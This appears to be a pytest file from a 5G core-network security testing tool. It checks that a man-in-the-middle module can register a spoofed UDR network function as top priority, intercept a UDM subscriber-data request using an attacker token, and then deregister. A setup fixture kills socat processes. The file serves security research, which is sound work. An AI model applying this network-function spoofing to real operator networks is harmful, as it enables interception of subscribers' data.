import httpx
import json
import urllib
import pytest
import os 

from src.attacks.api_cn.cn_mitm import CNMitm
from src.utils.common import ip_list

@pytest.fixture(autouse=True)
def clear_ues():
    
    # Setup
    os.popen("pkill -f socat")
    
    # Execution
    yield 


def test_manipulation():
    
    nf_to_spoof = "UDR"
    assert CNMitm.start(nf_to_spoof)
    
    # Verify that the mitm is registered
    infos = CNMitm.attacker_instance.get_nf_info(CNMitm.attacker_token, nf_to_spoof)
    assert infos 
    assert "nfInstances" in infos 
    assert len(infos["nfInstances"]) >= 2
    
    # Verify that the mitm is the oldest (= top priority NF)
    oldest_nf = infos["nfInstances"][0]
    assert CNMitm.mitm_instance.ip_address == oldest_nf["ipv4Addresses"][0]
    assert CNMitm.mitm_instance.nf_instance_id == oldest_nf["nfInstanceId"]
    
    # Send legitimate UDM request
    # With this request, the UDM is supposed to ask the UDR (which is now our mitm)
    # If we have a response the mitm is well established
    # It can be further verified with wireshark 
    # The sequence is supposed to be :
    #   MITM (fake legitimate) -> UDM 
    #   UDM -> MITM (fake UDR)
    #   MITM (fake UDR) -> UDR
    #   UDR -> MITM (fake UDR)
    #   MITM (fake UDR) -> UDM 
    #   UDM -> MITM (fake legitimate)
    ip   = f"http://{ip_list["UDM"]}:8000/"  # MITM iP
    supi = "imsi-208930000000001"
    url  = ip + f"nudm-sdm/v2/{supi}/smf-select-data"
    data = {"plmn-id": json.dumps({"mcc": "208", "mnc": "93"})}
    
    # Basic headers
    headers = {
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Authorization": f"Bearer {CNMitm.attacker_token}",
    }

    # Send the request to the target server
    with httpx.Client(http1=False, http2=True, verify=False) as client:
        if data:
            query_string = urllib.parse.urlencode(data, doseq=True)
            url += f"?{query_string}"
        response = client.request("GET", url, headers=headers)
        
    # Check if request worked
    assert 200 <= response.status_code < 300
    
    # Stop the mitm 
    assert CNMitm.stop() 
    
    # Verify that the mitm is deregistered
    infos = CNMitm.attacker_instance.get_nf_info(CNMitm.attacker_token, nf_to_spoof)
    assert infos 
    assert "nfInstances" in infos 
    assert len(infos["nfInstances"]) >= 1
    
    # Verify that the mitm is the oldest (= top priority NF)
    oldest_nf = infos["nfInstances"][0]
    assert CNMitm.mitm_instance.nf_instance_id != oldest_nf["nfInstanceId"]
